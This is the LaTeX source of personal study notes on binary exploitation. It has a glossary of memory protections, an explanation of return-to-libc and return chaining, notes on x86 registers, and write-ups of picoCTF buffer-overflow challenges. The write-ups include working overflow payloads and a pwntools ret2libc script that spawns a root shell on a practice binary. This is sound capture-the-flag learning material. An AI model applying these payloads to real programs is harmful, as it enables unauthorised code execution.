\documentclass{article}
\title{Binary Exploitation Journey}
\author{b0th}
\date{May 25, 2020}

\usepackage{geometry}
\geometry{legalpaper, margin=1.2in}

\usepackage{hyperref}
\hypersetup{
    colorlinks=true,
    linkcolor=cyan,
    filecolor=blue,      
    urlcolor=cyan,
}

\usepackage{xcolor
}
\usepackage{framed}
\definecolor{shadecolor}{RGB}{200,200,200}

\usepackage{listings}

\begin{document}
\maketitle

\section{Expressions}
\subsection{Technicals}

\begin{description}
\item [ASLR (Address Space Layout Randomization)] Security measure in modern OSes to randomize stack and libc addresses on each program execution. 
\item [Binary] A binary is the output file from compiling a C or C++ file. Anything in the binary has a constant address (usually... see PIE.)
\item [Canary] A canary is some (usually random) value that is used to verify that nothing has been overrwritten. Programs may place canaries in memory, and check that they still have the exact same value after running potentially dangerous code, verifying the integrity of that memory.
\item [GOT (Global Offset Table)]  The GOT is a table of addresses stored in the data section of memory. Executed programs use it to look up the runtime addresses of global variables that are unknown at compile time.
\item [Heap] The heap is a far more reliable memory space similar to the stack. However, usage of the heap has to be invoked by the coder, so heap problems are often their own category of exploitation
\item [NX (Non-Executable)] Security measure in modern OSes to separate processor instructions (code) and data (everything that's not code.) This prevents memory from being both executable and writable.
\item [PIE (Position Independent Executable)] Essentially ASLR, but for the binary itself. When this protection is enabled, locations of actual code in the binary are randomized.
\item [PLT (Procedure Linkage Table)] The PLT is essentially a wrapper function for all functions directly called in the binary. Only used in dynamically linked binaries.
\item [ROP (Return Oriented Programming)] Reusing tiny bits of code throughout the binary to construct commands we want to execute.
\item [Stack] The stack is part of the memory for a binary. Local variables and pointers are often stored here. The stack can be randomized.

\end{description}

\subsection{Generals}

\begin{description}
\item [Arbitrary] This word is used to imply the fullness of control that you might have given an exploit. If you've achieved arbitrary code execution, that means you can run, read, or write whatever commands you choose.
\item [Reliable] Reliable in the context of binary exploitation is almost exactly the same as regular use. An exploit is said to be reliable if it works across different runs consistently. It might seem dumb to define this work, but somtimes with exploits you will only have the option to make an unreliable exploit.
\end{description}

\section{Exploits}

\subsection{Buffer Overflow}
Anomaly where a program, while writing data to a buffer, overruns the buffer's boundary and overwrites adjacent memory locations.

\subsection{Return-to-libc}
We overwrite the return adress with the adress of a useful function in a system library: \textit{system()}(This functions is in libc. The overwritten data on the stack will be used as the function arguments. It will simulate a call to this funtion \textit{system()} with arguments we control.

Representation of the added data in the stack with \textit{system()}:

\ttfamily
\&\textit{system()} + \&return\_adr + \&arg\_1 + \&arg\_2
\rmfamily
\subsection{Return Chaining}
Its used to call multiple functions in succession. The first functions must return into a \textit{pop~--- pop~--- ret}(2 \textit{pop} for 2 arguments) sequence to remove its arguments from the stack and return the second function.

Representation of the added data in the stack 

\ttfamily
\&func\_1 + \&pop + \&pop + \&ret + \&arg\_1 + \&arg\_2 + \&func\_2 + \&pop + \&pop + \&ret + \&arg\_1 + \&arg\_2
\rmfamily

\section{Registers}

Processor operations mostly involve processing data. This data can be stored in memory and accessed from thereon. However, reading data from and storing data into memory slows down the processor, as it involves complicated processes of sending the data request across the control bus and into the memory storage unit and getting the data through the same channel.

\begin{description}
\item [Register] Internal memory storage location
\end{description}

The registers store data elements for processing without having to access the memory. A limited number of registers are built into the processor chip.

\section{General Registers}

This sort of register is divided into 3 groups:
\begin{itemize}
	\item \textbf{Data} registers
	\item \textbf{Pointer} registers
	\item \textbf{Index} registers
\end{itemize}

\subsection{Data Registers}

\begin{description}
	\item [Accumulator] \Big(AH(8 bits) + AL(8 bits)\Big) $\in$ AX(16 bits) $\in$ EAX(32 bits)
	\item [Base] \Big(BH(8 bits) + BL(8 bits)\Big) $\in$ BX(16 bits) $\in$ EBX(32 bits)
	\item [Counter] \Big(CH(8 bits) + CL(8 bits)\Big) $\in$ CX(16 bits) $\in$ ECX(32 bits)
	\item [Data] \Big(DH(8 bits) + DL(8 bits)\Big) $\in$ DX(16 bits) $\in$ EDX(32 bits)
\end{description}

\textbf{Usage}: Arithmetic, logical and operations 
\subsection{Pointer Registers}

todo...

\section{Laboratory}
\textit{flag.txt} content\textrightarrow ``b0th".

\subsection{Buffer Overflow 0}

Links:
\href{https://tcode2k16.github.io/blog/picoctf-2018-writeup/Binary%20Exploitation/buffer%20overflow%201/vuln}{Binary}
\href{https://tcode2k16.github.io/blog/picoctf-2018-writeup/Binary%20Exploitation/buffer%20overflow%201/vuln.c}{Source}

To solve this challenge, just understand that in this program the segmentation fault calls the \textit{sigsegv\_handler} function that reads the content of \textit{flag.txt}.

\begin{snugshade*}
\ttfamily
	\begin{lstlisting}
./vuln \$(python -c "print 'A'*30")
b0th
	\end{lstlisting}
\end{snugshade*}

\subsection{Buffer Overflow 1
}
Links: 
\href{https://tcode2k16.github.io/blog/picoctf-2018-writeup/Binary%20Exploitation/buffer%20overflow%201/vuln}{Binary}
\href{https://tcode2k16.github.io/blog/picoctf-2018-writeup/Binary%20Exploitation/buffer%20overflow%201/vuln.c}{Source}

We have buffer size of 32 bytes, and we want to jump to the win function. This program is using \textit{gets()} which is dangerous because it doesnt check the string lenght. So we know it will be easier to overwrite the return adress of \textit{vuln()} function.

\textit{win()} adress: \ttfamily 0x080485cb \rmfamily

This function read \textit{flag.txt} too.
\begin{snugshade*}
\ttfamily
	\begin{lstlisting}
python -c "print 'A'*44 + '\xcb\x85\x04\x08'" | ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80485cb
b0th
Erreur de segmentation
	\end{lstlisting}
\end{snugshade*}

\subsection{OverFlow 1}
Links:
\href{https://2019shell1.picoctf.com/static/884e03d84d1888395564a0f871bb2c69/vuln}{Binary}
\href{https://2019shell1.picoctf.com/static/884e03d84d1888395564a0f871bb2c69/vuln.c}{Source}

Same format as \textbf{Buffer Overflow 1}. We want to overwrite the \textit{vuln()}'s return adress and we want to jump to \textit{flag()}.

\textit{flag()} adress: \ttfamily 0x080485e6\rmfamily

\begin{snugshade*}
	\ttfamily
	\begin{lstlisting}
python -c "print 'A'*76+'\xe6\x85\x04\x08'" | ./vuln
Give me a string and lets see what happens: 
Woah, were jumping to 0x80485e6 !
b0th
Erreur de segmentation
	\end{lstlisting}
\end{snugshade*}

\subsection{ret2libc}
Source: vuln.c

\begin{snugshade*}
	\ttfamily
	\begin{lstlisting}
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void func(char *arg)
{
    char buffer[8];
    strcpy(buffer,arg);
    printf("%s\n", buffer);
}

int main(int argc, char *argv[])
{
    if(argc != 2) printf("binary <chaine>\n");
    else func(argv[1]);
    return 0;
}
	\end{lstlisting}
\end{snugshade*}

\begin{enumerate}
	\item Find how many byte we need to control \ttfamily eip\rmfamily.

		We need 20 bytes before overwriting the return adress.
	\item Find a libc function adress, we will take \textit{system()}.

		\textit{system()} adress: \ttfamily 0xf7e06660\rmfamily
	\item Find an arg for \textit{system()}, \ttfamily "/bin/sh" \rmfamily seems to be interesting.

		\ttfamily "/bin/sh"\rmfamily  adress: \ttfamily 0xf7f4a406\rmfamily
\end{enumerate}

\begin{snugshade*}
	\ttfamily
	\begin{lstlisting}
./vuln  $(python -c "print 'A'*20 + '\x60\x66\xe0\xf7' + 'NOPE' + 
'\x06\xa4\xf4\xf7'")
# echo b0th
b0th
# exit
Erreur de segmentation
	\end{lstlisting}
\end{snugshade*}

solve.py (I have made): 
\begin{snugshade*}
	\ttfamily
	\begin{lstlisting}
from pwn import *

#adress
system= 0xf7e06660
binsh=0xf7f4a406

#payload
payload='A'*20
payload+=p32(system)
payload+='NOPE'
payload+=p32(binsh)

#run binary
p=process(['./vuln',payload])

p.interactive()
	\end{lstlisting}
\end{snugshade*}

\section{Notes}
\begin{enumerate}
	\item Segmentation fault means it tried to acces an adress that doesnt even exist.
	\item However, \textit{vuln()} needs to know where to return to in \textit{main()} when it finishes. This is called a return address. It is supposed to go to the instruction right after \textit{main()} calls \textit{vuln()}. When we get a segmentation fault, that means that we've overwritten the return address. Representation of a stack part from a vuln program using \textit{strcpy()} function:

		If we dont overwrite the return adress, basically it will get back into \textit{main()}.

	\item A character seems to be stored in a byte(octet).
	\item Always check if PIE is enabled. If its not, it will be way easier.
	\item Return-to-libc doesnt need a valid return adress because we execute only one function.

\end{enumerate}

\end{document}

